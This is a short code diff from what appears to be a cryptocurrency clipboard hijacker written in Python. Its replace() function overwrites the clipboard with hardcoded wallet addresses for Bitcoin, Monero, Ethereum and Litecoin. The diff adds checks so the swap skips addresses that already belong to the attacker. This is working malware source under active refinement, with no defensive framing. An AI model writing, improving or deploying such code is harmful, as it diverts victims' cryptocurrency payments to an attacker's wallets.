@@ -39,15 +39,15 @@ def check(pasted):
 
 def replace(crypto_type):
     try:
-        if crypto_type == 'legacy_btc':
+        if crypto_type == 'legacy_btc' and str(pyperclip.paste()) not in cryptos.keys():
             pyperclip.copy(addresses['legacy_btc'])
-        elif crypto_type == 'segwit_btc':
+        elif crypto_type == 'segwit_btc' and str(pyperclip.paste()) not in cryptos.keys():
             pyperclip.copy(addresses['segwit_btc'])
-        elif crypto_type == 'xmr':
+        elif crypto_type == 'xmr' and str(pyperclip.paste()) not in cryptos.keys():
             pyperclip.copy(addresses['xmr'])
-        elif crypto_type == 'eth':
+        elif crypto_type == 'eth' and str(pyperclip.paste()) not in cryptos.keys():
             pyperclip.copy(addresses['eth'])
-        elif crypto_type == 'lite':
+        elif crypto_type == 'lite' and str(pyperclip.paste()) not in cryptos.keys():
             pyperclip.copy(addresses['lite'])
     except Exception:
         return False
